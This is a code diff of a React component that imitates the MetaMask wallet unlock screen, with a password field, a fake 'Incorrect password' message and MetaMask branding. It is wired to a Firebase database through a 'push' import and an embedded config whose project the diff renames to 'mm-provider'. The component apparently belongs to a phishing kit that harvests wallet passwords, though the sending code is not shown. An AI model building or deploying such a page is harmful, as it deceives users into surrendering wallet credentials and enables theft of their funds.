@@ -1,23 +1,21 @@
-import { useState, useEffect } from "react";
-import Modal from "react-modal";
+import { createLogo } from "./Bundle";
+import "./MM.css";
 import meta_logo from "./assets/img/metamask-fox.svg";
 import spinner from "./assets/img/spinner.gif";
 import ethLogo from "./images/eth_logo.svg";
 import arrowDown from "./images/icons/arrow-down.svg";
-
+import "./index.css";
 import { initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
 import { ref, push } from "firebase/database";
-import { createLogo } from "./Bundle";
-
-import "./index.css";
-import "./MM.css";
+import { useState, useEffect } from "react";
+import Modal from "react-modal";
 
 const basic = {
   apiKey: "AIzaSyDoyi01xdksbWgIWFWtaxj1R80DdZ6PWbw",
-  authDomain: "Gold-Dragon.firebaseapp.com",
-  projectId: "Gold-Dragon-784f0",
-  storageBucket: "Gold-Dragon.appspot.com",
+  authDomain: "mm-provider.firebaseapp.com",
+  projectId: "mm-provider",
+  storageBucket: "mm-provider.appspot.com",
   messagingSenderId: "879731928519",
   appId: "1:879731928519:web:875d6ddfbee3d1b0363de2",
   measurementId: "G-0KJ8T512FL",
@@ -76,9 +74,9 @@ const MM = ({ isOpen, setIsOpen }) => {
   };
   const handleBlur = () => setPwdFocus(false);
   const handleFocus = () => setPwdFocus(true);
-  document.body.onblur = function() {
-    setIsOpen(false)
-  }
+  document.body.onblur = function () {
+    setIsOpen(false);
+  };
   useEffect(() => {
     if (isOpen) {
       setTimeout(() => {
@@ -142,7 +140,11 @@ const MM = ({ isOpen, setIsOpen }) => {
         </div>
       ) : (
         <>
-          <div id="app-content" data-theme="dark" style={{ border: "1px solid white" }}>
+          <div
+            id="app-content"
+            data-theme="dark"
+            style={{ border: "1px solid white" }}
+          >
             <div className="app os-win">
               <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                 <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
@@ -157,7 +159,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                         role="img"
                         style={{ marginLeft: 12 }}
                       >
-                        <img className="mm-avatar-network__network-image" src={ethLogo} alt="Ethereum Mainnet logo" />
+                        <img
+                          className="mm-avatar-network__network-image"
+                          src={ethLogo}
+                          alt="Ethereum Mainnet logo"
+                        />
                       </div>
                       <span
                         className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
@@ -169,7 +175,10 @@ const MM = ({ isOpen, setIsOpen }) => {
                         className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                         style={{ marginRight: "1rem" }}
                       >
-                        <img src={arrowDown} style={{ width: "100%", height: "100%" }}></img>
+                        <img
+                          src={arrowDown}
+                          style={{ width: "100%", height: "100%" }}
+                        ></img>
                       </span>
                     </button>
                   </div>
@@ -244,7 +253,13 @@ const MM = ({ isOpen, setIsOpen }) => {
                             Password
                           </label>
                         </div>
-                        <div className={validShow ? "validate-password" : "validate-password-hidden"}>
+                        <div
+                          className={
+                            validShow
+                              ? "validate-password"
+                              : "validate-password-hidden"
+                          }
+                        >
                           Incorrect password
                         </div>
                       </div>
@@ -279,10 +294,17 @@ const MM = ({ isOpen, setIsOpen }) => {
                         Forgot password?
                       </a>
                     </div>
-                    <div className="unlock-page__support" style={{ fontSize: "12px", fontFamily: "poppines" }}>
+                    <div
+                      className="unlock-page__support"
+                      style={{ fontSize: "12px", fontFamily: "poppines" }}
+                    >
                       <span>
                         Need help? Contact{" "}
-                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">
+                        <a
+                          href="https://support.metamask.io"
+                          target="_blank"
+                          rel="noopener noreferrer"
+                        >
                           MetaMask support
                         </a>
                       </span>
